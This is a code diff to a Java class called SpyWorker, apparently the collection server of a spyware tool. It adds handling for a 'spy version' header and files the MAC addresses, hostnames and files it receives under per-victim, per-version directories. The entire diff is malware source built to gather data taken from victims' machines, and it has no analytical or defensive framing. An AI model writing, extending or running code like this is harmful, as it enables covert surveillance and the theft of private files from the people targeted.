@@ -60,6 +60,30 @@ public class SpyWorker extends Thread implements Closeable {
             case SpyDataHeader.HEADER_HOSTNAME:
                 receiveHostName(header.getContentLength());
                 break;
+            case SpyDataHeader.HEADER_VERSION:
+                receiveVersion(header.getContentLength());
+                break;
+        }
+    }
+
+    private void receiveVersion(int contentLength) throws IOException {
+        if (victimDir == null) {
+            Log.e("No victim directory exists!");
+            return;
+        }
+        Log.i("Receiving spy version...");
+        SpyVersionReceiver receiver = new SpyVersionReceiver(reader, writer, contentLength, victimDir);
+        receiver.start();
+        String spyVersion = receiver.getSpyVersion();
+        if (spyVersion != null) {
+            try {
+                File verDir = new File(victimDir, spyVersion);
+                if (!verDir.isDirectory())
+                    verDir.mkdirs();
+                dscFile = new SpyDscFile(new File(verDir, Config.DSC_FILENAME).getPath());
+            } catch (INIBadFormatException e) {
+                e.printStackTrace();
+            }
         }
     }
 
@@ -77,23 +101,17 @@ public class SpyWorker extends Thread implements Closeable {
         Log.i("Receiving MAC address...");
         SpyMACReceiver receiver = new SpyMACReceiver(reader, writer, contentLength);
         receiver.start();
-        if (receiver.getVictimDir() != null) {
+        if (receiver.getVictimDir() != null)
             this.victimDir = new File(Config.WORKING_DIR, receiver.getVictimDir());
-            try {
-                dscFile = new SpyDscFile(new File(victimDir, "version0").getPath());
-            } catch (INIBadFormatException e) {
-                e.printStackTrace();
-            }
-        }
     }
 
     private void receiveFile(int contentLength) throws IOException {
-        if (victimDir == null || !victimDir.isDirectory()) {
+        if (dscFile == null) {
             Log.e("No victim directory exists!");
             return;
         }
         Log.i(String.format("Receiving file[%d bytes]...", contentLength));
-        SpyFileReceiver receiver = new SpyFileReceiver(reader, writer, contentLength, victimDir);
+        SpyFileReceiver receiver = new SpyFileReceiver(reader, writer, contentLength, dscFile.getBaseFile().getParentFile());
         try {
             receiver.start();
             Log.i("Received file");
